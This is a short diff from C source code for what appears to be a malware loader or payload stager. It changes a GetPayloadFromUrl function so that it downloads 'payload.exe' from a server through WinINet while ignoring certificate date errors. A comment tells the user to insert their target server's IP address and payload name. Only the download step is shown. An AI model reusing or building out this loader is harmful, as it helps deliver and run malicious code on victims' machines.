@@ -14,7 +14,7 @@ BOOL GetPayloadFromUrl() {
         return FALSE;
     }
 
-    hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/Injector.exe", NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
+    hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/payload.exe", NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0); // write your target server's ip and payload name
     if (hInternetFile == NULL) {
         printf("[!] InternetOpenUrlW Failed With Error : %d\n", GetLastError());
         InternetCloseHandle(hInternet);
